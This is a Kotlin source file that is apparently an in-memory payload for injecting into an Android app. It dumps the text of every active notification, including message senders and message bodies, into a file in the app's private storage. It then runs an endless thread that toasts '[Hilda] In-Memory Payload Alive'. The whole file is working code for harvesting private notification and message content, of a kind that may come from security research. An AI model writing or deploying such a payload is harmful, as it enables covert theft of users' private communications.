package com.example.injectedclass

import android.app.Notification
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.Parcelable
import android.util.Log
import android.widget.Toast
import java.io.File

class NotificationDumper {

    companion object {
        private const val TAG = "NotificationDumper"

        @JvmStatic
        fun dumpNotifications(context: Context?) {
            if (context == null) return

            val notificationManager =
                context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                    ?: return

            val activeNotifications = notificationManager.activeNotifications ?: return

            val tmpFile = File(context.filesDir, "notif_dump.txt.tmp")
            val finalFile = File(context.filesDir, "notif_dump.txt")

            try {
                tmpFile.printWriter().use { out ->

                    out.println("dump_count=${activeNotifications.size}")

                    activeNotifications.forEachIndexed { i, sbn ->
                        val notif = sbn.notification

                        val isGroupSummary = (notif.flags and Notification.FLAG_GROUP_SUMMARY) != 0

                        out.println("notif.$i.post_time_ms=${sbn.postTime}")
                        out.println("notif.$i.id=${sbn.id}")
                        out.println("notif.$i.package_name=${sbn.packageName}")
                        out.println("notif.$i.is_group_summary=$isGroupSummary")

                        val extras = notif.extras ?: return@forEachIndexed

                        val title =
                            extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
                        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

                        out.println("notif.$i.title=$title")
                        out.println("notif.$i.text=$text")


                        val parcelables =
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                extras.getParcelableArray(
                                    Notification.EXTRA_MESSAGES,
                                    Parcelable::class.java
                                )
                            } else {
                                @Suppress("DEPRECATION")
                                extras.getParcelableArray(Notification.EXTRA_MESSAGES)
                            }

                        if (parcelables != null) {
                            val messages =
                                Notification.MessagingStyle.Message.getMessagesFromBundleArray(
                                    parcelables
                                )
                            messages.forEachIndexed { msgIndex, msg ->
                                val senderName = msg.senderPerson?.name ?: "Unknown"
                                out.println("notif.$i.msg.$msgIndex.sender=$senderName")
                                out.println("notif.$i.msg.$msgIndex.text=${msg.text}")
                            }
                        }

                        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                        textLines?.forEachIndexed { lineIndex, line ->
                            out.println("notif.$i.line.$lineIndex=$line")
                        }
                    }
                }

                if (tmpFile.renameTo(finalFile)) {
                    Log.i(TAG, "[+] dump written to ${finalFile.absolutePath}")
                } else {
                    Log.e(TAG, "[-] rename failed")
                }

            } catch (e: Exception) {
                Log.e(TAG, "[-] Exception during dump: ${e.message}")
                e.printStackTrace()
            }

            startGhostThread(context)
        }

        private fun startGhostThread(context: Context?) {
            if (context == null) return

            Thread {
                val mainHandler = Handler(Looper.getMainLooper())
                var tick = 0

                while (true) {
                    tick++
                    val message = "[Hilda] In-Memory Payload Alive: $tick"

                    Log.i(TAG, message)

                    mainHandler.post {
                        try {
                            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
                        } catch (e: Exception) {
                            Log.e(TAG, "Fail to show Toast: ${e.message}")
                        }
                    }

                    try {
                        Thread.sleep(10000)
                    } catch (e: InterruptedException) {
                        break
                    }
                }
            }.start()
        }
    }
}